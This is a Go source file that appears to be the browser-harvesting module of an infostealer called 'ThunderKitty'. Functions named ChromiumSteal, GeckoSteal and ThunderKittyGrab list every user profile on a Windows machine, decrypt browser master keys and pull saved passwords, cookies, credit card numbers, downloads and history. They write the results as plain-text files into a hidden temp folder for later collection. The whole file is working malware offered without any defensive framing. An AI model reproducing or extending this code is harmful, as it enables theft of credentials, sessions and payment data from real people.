package browsers

import (
	"fmt"
	"io/ioutil"
	"os"
	"path/filepath"
	"strings"
	"syscall"

	"github.com/shirou/gopsutil/disk"
)


// added:
func IsElevated() bool {
	ret, _, _ := syscall.NewLazyDLL("shell32.dll").NewProc("IsUserAnAdmin").Call()
	return ret != 0
}

func GetUsers() []string {
	if !IsElevated() {
		return []string{os.Getenv("USERPROFILE")}
	}

	var users []string
	drives, err := disk.Partitions(false)
	if err != nil {
		return []string{os.Getenv("USERPROFILE")}
	}

	for _, drive := range drives {
		mountpoint := drive.Mountpoint

		files, err := os.ReadDir(fmt.Sprintf("%s//Users", mountpoint))
		if err != nil {
			continue
		}

		for _, file := range files {
			if !file.IsDir() {
				continue
			}
			users = append(users, filepath.Join(fmt.Sprintf("%s//Users", mountpoint), file.Name()))
		}
	}

	return users
}

///

func IsDir(path string) bool {
	fileInfo, err := os.Stat(path)
	if err != nil {
		return false
	}
	return fileInfo.IsDir()
}

func Exists(path string) bool {
	_, err := os.Stat(path)
	return !os.IsNotExist(err)
}

func AppendFile(path string, line string) {
	file, _ := os.OpenFile(path, os.O_WRONLY|os.O_APPEND|os.O_CREATE, 0644)
	defer file.Close()
	file.WriteString(line + "\n")
}

func Tree(path string, prefix string, isFirstDir ...bool) string {
	var sb strings.Builder

	files, _ := ioutil.ReadDir(path)
	for i, file := range files {
		isLast := i == len(files)-1
		var pointer string
		if isLast {
			pointer = prefix + "└── "
		} else {
			pointer = prefix + "├── "
		}
		if isFirstDir == nil {
			pointer = prefix
		}
		if file.IsDir() {
			fmt.Fprintf(&sb, "%s📂 - %s\n", pointer, file.Name())
			if isLast {
				sb.WriteString(Tree(filepath.Join(path, file.Name()), prefix+"    ", false))
			} else {
				sb.WriteString(Tree(filepath.Join(path, file.Name()), prefix+"│   ", false))
			}
		} else {
			fmt.Fprintf(&sb, "%s📄 - %s (%.2f kb)\n", pointer, file.Name(), float64(file.Size())/1024)
		}
	}

	tree := sb.String()
	if len(tree) > 4090 {
		tree = "Too many files to display"
	}
	return tree
}



//

func ChromiumSteal() []Profile {
	var prof []Profile
	for _, user := range GetUsers() {
		for name, path := range GetChromiumBrowsers() {
			path = filepath.Join(user, path)
			if !IsDir(path) {
				continue
			}

			browser := Browser{
				Name: name,
				Path: path,
				User: strings.Split(user, "\\")[2],
			}

			var profilesPaths []Profile
			if strings.Contains(path, "Opera") {
				profilesPaths = append(profilesPaths, Profile{
					Name:    "Default",
					Path:    browser.Path,
					Browser: browser,
				})

			} else {
				folders, err := os.ReadDir(path)
				if err != nil {
					continue
				}
				for _, folder := range folders {
					if folder.IsDir() {
						dir := filepath.Join(path, folder.Name())
						if Exists(filepath.Join(dir, "Web Data")) {
							profilesPaths = append(profilesPaths, Profile{
								Name:    folder.Name(),
								Path:    dir,
								Browser: browser,
							})
						}

					}
				}
			}

			if len(profilesPaths) == 0 {
				continue
			}

			c := Chromium{}
			err := c.GetMasterKey(path)
			if err != nil {
				continue
			}
			for _, profile := range profilesPaths {
				profile.Logins, _ = c.GetLogins(profile.Path)
				profile.Cookies, _ = c.GetCookies(profile.Path)
				profile.CreditCards, _ = c.GetCreditCards(profile.Path)
				profile.Downloads, _ = c.GetDownloads(profile.Path)
				profile.History, _ = c.GetHistory(profile.Path)
				prof = append(prof, profile)
			}

		}
	}
	return prof
}

func GeckoSteal() []Profile {
	var prof []Profile
	for _, user := range GetUsers() {
		for name, path := range GetGeckoBrowsers() {
			path = filepath.Join(user, path)
			if !IsDir(path) {
				continue
			}

			browser := Browser{
				Name: name,
				Path: path,
				User: strings.Split(user, "\\")[2],
			}

			var profilesPaths []Profile

			profiles, err := os.ReadDir(path)
			if err != nil {
				continue
			}
			for _, profile := range profiles {
				if !profile.IsDir() {
					continue
				}
				dir := filepath.Join(path, profile.Name())
				files, err := os.ReadDir(dir)
				if err != nil {
					continue
				}
				if len(files) <= 10 {
					continue
				}

				profilesPaths = append(profilesPaths, Profile{
					Name:    profile.Name(),
					Path:    dir,
					Browser: browser,
				})
			}

			if len(profilesPaths) == 0 {
				continue
			}

			for _, profile := range profilesPaths {
				g := Gecko{}
				g.GetMasterKey(profile.Path)
				profile.Logins, _ = g.GetLogins(profile.Path)
				profile.Cookies, _ = g.GetCookies(profile.Path)
				profile.Downloads, _ = g.GetDownloads(profile.Path)
				profile.History, _ = g.GetHistory(profile.Path)
				prof = append(prof, profile)
			}

		}
	}
	return prof
}

func ThunderKittyGrab() {
	browsersDir := filepath.Join(os.TempDir(), "ThunderKitty", "Browsers")
	os.MkdirAll(browsersDir, os.ModePerm)

	var profiles []Profile
	profiles = append(profiles, ChromiumSteal()...)
	profiles = append(profiles, GeckoSteal()...)

	if len(profiles) == 0 {
		return
	}

	for _, profile := range profiles {
		if len(profile.Logins) == 0 && len(profile.Cookies) == 0 && len(profile.CreditCards) == 0 && len(profile.Downloads) == 0 && len(profile.History) == 0 {
			continue
		}
		userDir := filepath.Join(browsersDir, profile.Browser.User, profile.Browser.Name, profile.Name)
		os.MkdirAll(userDir, os.ModePerm)

		if len(profile.Logins) > 0 {
			AppendFile(filepath.Join(userDir, "logins.txt"), fmt.Sprintf("%-50s %-50s %-50s", "URL", "Username", "Password"))
			for _, login := range profile.Logins {
				AppendFile(filepath.Join(userDir, "logins.txt"), fmt.Sprintf("%-50s %-50s %-50s", login.LoginURL, login.Username, login.Password))
			}
		}

		if len(profile.Cookies) > 0 {
			for _, cookie := range profile.Cookies {
				var expires string
				if cookie.ExpireDate == 0 {
					expires = "FALSE"
				} else {
					expires = "TRUE"
				}

				var host string
				if strings.HasPrefix(cookie.Host, ".") {
					host = "FALSE"
				} else {
					host = "TRUE"
				}

				AppendFile(filepath.Join(userDir, "cookies.txt"), fmt.Sprintf("%s\t%s\t%s\t%s\t%d\t%s\t%s", cookie.Host, expires, cookie.Path, host, cookie.ExpireDate, cookie.Name, cookie.Value))
			}
		}

		if len(profile.CreditCards) > 0 {
			AppendFile(filepath.Join(userDir, "credit_cards.txt"), fmt.Sprintf("%-30s %-30s %-30s %-30s %-30s", "Number", "Expiration Month", "Expiration Year", "Name", "Address"))
			for _, cc := range profile.CreditCards {
				AppendFile(filepath.Join(userDir, "credit_cards.txt"), fmt.Sprintf("%-30s %-30s %-30s %-30s %-30s", cc.Number, cc.ExpirationMonth, cc.ExpirationYear, cc.Name, cc.Address))
			}
		}

		if len(profile.Downloads) > 0 {
			AppendFile(filepath.Join(userDir, "downloads.txt"), fmt.Sprintf("%-70s %-70s", "Target Path", "URL"))
			for _, download := range profile.Downloads {
				AppendFile(filepath.Join(userDir, "downloads.txt"), fmt.Sprintf("%-70s %-70s", download.TargetPath, download.URL))
			}
		}

		if len(profile.History) > 0 {
			AppendFile(filepath.Join(userDir, "history.txt"), fmt.Sprintf("%-70s %-70s", "Title", "URL"))
			for _, history := range profile.History {
				AppendFile(filepath.Join(userDir, "history.txt"), fmt.Sprintf("%-70s %-70s", history.Title, history.URL))
			}
		}
	}
}
